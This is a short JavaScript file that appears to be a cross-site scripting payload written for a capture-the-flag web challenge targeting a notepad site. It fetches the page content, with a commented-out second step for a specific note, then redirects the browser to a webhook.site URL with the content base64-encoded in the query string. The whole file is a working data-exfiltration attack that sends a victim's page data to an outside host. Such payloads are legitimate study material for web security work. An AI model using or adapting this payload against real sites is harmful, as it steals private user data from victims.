var req = new XMLHttpRequest();
//step1
req.open("GET", "http://politenotepad.zajebistyc.tf/", false);
//step2
//req.open("GET", "http://politenotepad.zajebistyc.tf/note/NMRqFJTnDDkjUbRAmmQuJhtdKmQdfm", false);
//req.witthCredentials = true;
req.send(null)
var res = req.responseText;

location.href="https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?b=" + btoa(res)
